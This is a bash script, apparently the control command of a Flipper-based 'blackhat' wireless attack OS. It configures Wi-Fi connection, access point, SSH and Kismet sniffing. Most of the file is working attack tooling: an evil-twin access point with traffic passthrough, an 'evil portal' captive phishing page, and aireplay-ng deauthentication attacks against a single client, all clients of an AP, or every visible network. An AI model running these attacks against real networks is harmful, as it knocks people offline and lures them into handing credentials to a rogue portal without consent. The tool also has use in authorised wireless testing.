#!/bin/bash
set -m
exec > >(tee /dev/tty1) 2>&1
export PYTHONUNBUFFERED=1

CONFIG_F=blackhat.conf

if test -f $CONFIG_F; then
    CONFIG_F="$PWD/$CONFIG_F"
    LOG_F=blackhat.log
elif test -f /mnt/$CONFIG_F; then
    CONFIG_F=/mnt/$CONFIG_F
    LOG_F=/mnt/blackhat.log
elif test -f /etc/$CONFIG_F; then
    CONFIG_F=/etc/$CONFIG_F
    LOG_F=/var/log/blackhat.log
else
    echo "Could not load conf file"
    exit
fi

source "$CONFIG_F"
rm $LOG_F 2>/dev/null

function print_help() {
    echo "Commands:"
    echo "usage: bh wifi connect wlan0"
    echo "        bh set PASS 'my_wifi_password'"
    echo "  set"
    echo "    SSID              Set SSID of WiFi network to connect to"
    echo "    PASS              Set password for WiFi network: SSID"
    echo "    AP_SSID           Set SSID of WiFi network you're creating"
    echo "  wifi"
    echo "    list <iface>      List WiFi APs"
    echo "    con <iface|stop>  Connect/disconnect to WiFi network"
    echo "    dev               List wlan devices"
    echo "    ap <iface|stop>   Enable/disable Access Point"
    echo "    ip                Get IP Addresses"
    echo "  ssh [stop]          Enable/disable SSH daemon"
    echo "  evil_twin           Enable internet passthrough from AP to WiFi"
    echo "  evil_portal [stop]  Enable/disable evil portal the AP"
    echo "  kismet <iface|stop> Enable/disable Kismet"
    echo "  deauth <client_mac> <ap_mac> [iface]  Deauth specific client from AP"
    echo "  deauth_all <ap_mac> [iface]          Deauth all clients from AP"
    echo "  deauth_broadcast [iface]             Deauth all visible associations"
    echo "  deauth_scan [iface]                  Scan and show targets for deauth"
    echo "  test_inet           Ping google.com"
    echo "  get                 Get currently set parameters"
    echo "  script"
    echo "    scan"
    echo "    run <script>"
}

function validate_wlan_nic() {
    nic=$(bh wifi dev | grep "$1" | awk '{print $1}' | grep wlan | head -n1)
    if [ "$nic" != "$1" ]; then
        echo "Invalid wlan device!"
        exit
    fi
}

function connect_wifi() {
    check "$1"

    if [ "$1" = "stop" ]; then
        killall wpa_supplicant
        INET_NIC=$(cat /run/inet_nic 2>/dev/null) || exit
        ip link set $INET_NIC down
        rm /run/inet_nic
        echo "WiFi Disconnected"
        exit
    fi

    validate_wlan_nic "$1"
    INET_NIC=$1
    echo $INET_NIC > /run/inet_nic
    echo INET_NIC: $INET_NIC

    ip link set $INET_NIC up
    if [[ -z ${PASS:-} ]]; then
        echo "No password, connecting to open network"
        wpa_supplicant -B -i "$INET_NIC" -c <(cat <<EOF
network={
    ssid="$SSID"
    key_mgmt=NONE
}
EOF
)
    else
        echo "Password set"
        wpa_supplicant -B -i $INET_NIC -c <(wpa_passphrase "$SSID" "$PASS")
    fi
}

function start_ap() {
    check "$1"

    if [ "$1" = "stop" ]; then
        killall hostapd
        AP_NIC=$(cat /run/ap_nic 2>/dev/null) || exit
        ip link set $AP_NIC down
        ip addr flush $AP_NIC
        rm /run/ap_nic
        echo "AP Stopped"
        exit
    fi

    validate_wlan_nic "$1"
    AP_NIC=$1
    echo $AP_NIC > /run/ap_nic
    echo AP_NIC: $AP_NIC

    ip link set $AP_NIC down
    ip addr add $AP_IP/24 dev $AP_NIC

    sed -i "s/^ssid=.*/ssid=$AP_SSID/" /etc/hostapd.conf
    sed -i "s/^interface=.*/interface=$AP_NIC/" /etc/dnsmasq.conf

    kill $(pidof hostapd) 2>/dev/null
    hostapd /etc/hostapd.conf -i $AP_NIC &

    kill $(pidof dnsmasq) 2>/dev/null
    dnsmasq -C /etc/dnsmasq.conf -d 2>&1 > $LOG_F &
}

function get_5ghz_nic() {
    bh wifi dev | grep "5GHz" | awk '{print $1}' | grep wlan | head -n1
}

function get_2_4ghz_nic() {
    bh wifi dev | grep -v "5GHz" | awk '{print $1}' | grep wlan | head -n1
}

function evil_twin() {
    INET_NIC=$(cat /run/inet_nic 2>/dev/null) || { connect_wifi $(get_2_4ghz_nic); INET_NIC=$(cat /run/inet_nic); }
    AP_NIC=$(cat /run/ap_nic 2>/dev/null) || { start_ap $(get_5ghz_nic); AP_NIC=$(cat /run/ap_nic); }

    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    nft delete rule ip nat postrouting oifname "$INET_NIC" masquerade 2>/dev/null
    nft delete rule ip filter forward iifname "$AP_NIC" accept 2>/dev/null

    nft add table ip nat
    nft add chain ip nat postrouting '{ type nat hook postrouting priority 100 ; }'
    nft add rule ip nat postrouting oifname "$INET_NIC" masquerade

    nft add table ip filter
    nft add chain ip filter forward '{ type nat hook postrouting priority 100 ; }'
    nft add rule ip filter forward iifname "$AP_NIC" accept
}

function evil_portal() {
    if [ "$1" = "stop" ]; then
        killall nginx
        killall evil_portal
        echo "Evil Portal Stopped"
        exit
    fi

    INET_NIC=$(cat /run/inet_nic 2>/dev/null) || { connect_wifi $(get_2_4ghz_nic); INET_NIC=$(cat /run/inet_nic); }
    AP_NIC=$(cat /run/ap_nic 2>/dev/null) || { start_ap $(get_5ghz_nic); AP_NIC=$(cat /run/ap_nic); }

    echo 1 > /proc/sys/net/ipv4/ip_forward
    nft -f /etc/ep-rules.nft
    nft add rule ip nat postrouting oif $INET_NIC ip saddr @allowed_ips masquerade
    cp /mnt/index.html /var/www/

    kill -9 $(pidof dnsmasq) 2>/dev/null
    dnsmasq -C /etc/dnsmasq.conf -d 2>&1 > $LOG_F &

    kill -9 $(pidof nginx) 2>/dev/null
    mkdir /var/log/nginx 2>/dev/null
    nginx &

    kill -9 $(pidof evil_portal) 2>/dev/null
    ip link set lo up
    /usr/bin/evil_portal &
}

function set_param() {
    sed -i "/^export $1=/cexport $1=\'$2\'" "$CONFIG_F"
}

function check() {
    if [ -z "$1" ]; then
        print_help
        exit
    fi
}

function wifi() {
    subcommand="$1"; shift
    case "$subcommand" in
        list)
            check "$1"
            iw "$1" scan | grep "SSID:"
            ;;
        connect | con)
            connect_wifi "$@"
            ;;
        ap)
            start_ap "$@"
            ;;
        dev)
            s=$(iw dev | grep -e phy -e wlan)
            s=$(echo $s | sed 's/Interface//g')
            s=$(echo $s | sed 's/#//g')

            for word in $s; do
                if [[ $word == phy* ]]; then
                    phy=$word
                elif [[ $word == wlan* ]]; then
                    eval "$word=$phy"
                fi
            done

            # Manually loop through the wlanX variables
            i=0
            while true; do
                var="wlan$i"
                # Check if the variable exists by testing its value
                eval "value=\$$var"  # Dereference the variable using eval
                if [ -n "$value" ]; then
                    if iw $value info | grep -qE "5180|5200|5220|5240|5260"; then
                        echo "$var -> 2.4GHz / 5GHz"
                    else
                        echo "$var -> 2.4GHz"
                    fi
                else
                    break
                fi
                i=$((i+1))
            done
            ;;
        ip)
            ip addr | grep wlan | awk -F': <' '{print $1}' | awk -F'/24' '{print $1}'
            ;;
        *)
            print_help
    esac
}


function script() {
    subcommand="$1"; shift
    case "$subcommand" in
        scan)
            ls -1 --color=never /mnt/scripts/
            ;;
        run)
            "/mnt/scripts/$1"
            ;;
        *)
            print_help
    esac
}

function bh_kismet() {
    check "$1"

    if [ "$1" = "stop" ]; then
        killall kismet
        KISMET_NIC=$(cat /run/kismet_nic 2>/dev/null) || exit
        rm /run/kismet_nic
        echo "Kismet Stopped"
        exit
    fi

    validate_wlan_nic "$1"
    KISMET_NIC=$1
    echo $KISMET_NIC > /run/kismet_nic
    echo KISMET_NIC: $KISMET_NIC

    kismet -s \
        -c "$KISMET_NIC:channelhop=true,channels=\"36,40,44,48,149,153,157,161,165\"" \
        > /dev/null &
    echo "Kismet running on Port 2501"
}

function ssh() {
    if [ "$1" = "stop" ]; then
        killall dropbear
        echo "SSH Server Stopped"
        exit
    fi

    mkdir /var/run/dropbear 2>/dev/null
    /usr/sbin/dropbear -R
    echo "SSH Server Started"
    bh wifi ip
}

function setup_monitor_mode() {
    local iface=$1
    echo "Setting up monitor mode on $iface..."

    # Set to monitor mode
    ip link set $iface down
    iw dev $iface set type monitor 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "Failed to set monitor mode on $iface"
        return 1
    fi

    # Bring interface up
    ip link set $iface up
    echo "Monitor mode enabled on $iface"
    return 0
}

function deauth_scan() {
    local iface="${1:-wlan1}"

    echo "Setting up monitor mode on $iface for scanning..."
    setup_monitor_mode $iface
    if [ $? -ne 0 ]; then
        return 1
    fi

    echo "Scanning for targets on $iface (30 seconds)..."
    echo "Press Ctrl+C to stop early"
    echo ""
    echo "TARGET NETWORKS:"
    airodump-ng $iface --write /tmp/deauth_targets --output-format csv &
    SCAN_PID=$!
    sleep 30
    kill $SCAN_PID 2>/dev/null

    echo ""
    echo "=== SCAN RESULTS ==="
    echo "Access Points (Targets for deauth_all):"
    if [ -f /tmp/deauth_targets-01.csv ]; then
        grep -v "Station MAC" /tmp/deauth_targets-01.csv | grep -v "BSSID" | head -20 | while IFS=, read bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
            if [ -n "$bssid" ] && [ "$bssid" != "BSSID" ]; then
                echo "  AP: $bssid  Channel: $channel  ESSID: $essid"
            fi
        done
        echo ""
        echo "Connected Clients (Targets for deauth):"
        grep -A 1000 "Station MAC" /tmp/deauth_targets-01.csv | grep -v "Station MAC" | head -20 | while IFS=, read station_mac first_seen last_seen power packets bssid probed_essids; do
            if [ -n "$station_mac" ] && [ -n "$bssid" ]; then
                echo "  Client: $station_mac  ->  AP: $bssid"
            fi
        done
    fi

    echo ""
    echo "Usage examples:"
    echo "  bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 $iface"
    echo "  bh deauth_all 11:22:33:44:55:66 $iface"

    rm -f /tmp/deauth_targets* 2>/dev/null
}

function deauth_attack() {
    local client_mac="$1"
    local ap_mac="$2"
    local iface="${3:-wlan1}"
    local count="${4:-10}"

    if [ -z "$client_mac" ] || [ -z "$ap_mac" ]; then
        echo "Usage: bh deauth <client_mac> <ap_mac> [interface] [count]"
        echo "Example: bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 wlan1"
        echo ""
        echo "To find targets, run: bh deauth_scan [interface]"
        return 1
    fi

    echo "Deauth Attack:"
    echo "  Client: $client_mac"
    echo "  AP: $ap_mac"
    echo "  Interface: $iface"
    echo "  Count: $count"

    setup_monitor_mode $iface
    if [ $? -ne 0 ]; then
        return 1
    fi

    echo "Executing deauth attack..."
    aireplay-ng --deauth $count -a "$ap_mac" -c "$client_mac" $iface
    echo "Deauth attack completed"
}

function deauth_all() {
    local ap_mac="$1"
    local iface="${2:-wlan1}"
    local count="${3:-10}"

    if [ -z "$ap_mac" ]; then
        echo "Usage: bh deauth_all <ap_mac> [interface] [count]"
        echo "Example: bh deauth_all 11:22:33:44:55:66 wlan1"
        echo ""
        echo "To find targets, run: bh deauth_scan [interface]"
        return 1
    fi

    echo "Deauth All Clients:"
    echo "  Target AP: $ap_mac"
    echo "  Interface: $iface"
    echo "  Count: $count"

    setup_monitor_mode $iface
    if [ $? -ne 0 ]; then
        return 1
    fi

    echo "Executing deauth attack against all clients..."
    aireplay-ng --deauth $count -a "$ap_mac" $iface
    echo "Deauth all attack completed"
}

function deauth_broadcast() {
    local iface="${1:-wlan1}"
    local count="${2:-5}"

    echo "WARNING: Nuclear option - will deauth ALL visible associations!"
    echo "Interface: $iface"
    echo "Count: $count"
    echo ""
    echo "Press Ctrl+C within 5 seconds to cancel..."
    sleep 5

    setup_monitor_mode $iface
    if [ $? -ne 0 ]; then
        return 1
    fi

    echo "Scanning for targets..."
    rm /tmp/deauth_broadcast* 2>/dev/null
    airodump-ng $iface --write /tmp/deauth_broadcast --output-format csv > /dev/null 2>&1 &
    sleep 20
    kill $!
    echo "Scan finished"

    if [ -f /tmp/deauth_broadcast-01.csv ]; then
        echo "Executing broadcast deauth attacks..."
        grep -v "Station MAC" /tmp/deauth_broadcast-01.csv | grep -v "BSSID" | while IFS=, read bssid rest; do
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                echo "Deauthing AP: $bssid"
                iw dev wlan1 set channel 1 # Fix this later
                aireplay-ng --deauth $count -a "$bssid" $iface --ignore-negative-one
            fi
        done
        wait
        echo "Broadcast deauth completed"
    else
        echo "No targets found"
    fi

    rm -f /tmp/deauth_broadcast* 2>/dev/null
}

subcommand="$1"; shift
case "$subcommand" in
    set)
        set_param "$@"
        ;;
    get)
        echo "Loaded Config: $CONFIG_F"
        cat "$CONFIG_F"
        ;;
    wifi)
        wifi "$@"
        ;;
    ssh)
        ssh "$@"
        ;;
    evil_twin)
        evil_twin "$@"
        ;;
    evil_portal)
        evil_portal "$@"
        ;;
    kismet)
        bh_kismet "$@"
        ;;
    deauth)
        deauth_attack "$@"
        ;;
    deauth_all)
        deauth_all "$@"
        ;;
    deauth_scan)
        deauth_scan "$@"
        ;;
    deauth_broadcast)
        deauth_broadcast "$@"
        ;;
    test_inet)
        ping google.com -w 3
        ;;
    help)
        print_help
        ;;
    pull)
        scp machinehum@192.168.1.178:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.conf /mnt/
        scp machinehum@192.168.1.178:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.sh /tmp/bh
        echo "run: mv /tmp/bh /usr/bin/bh"
        ;;
    script)
        script "$@"
        ;;
    *)
        print_help
        ;;
esac
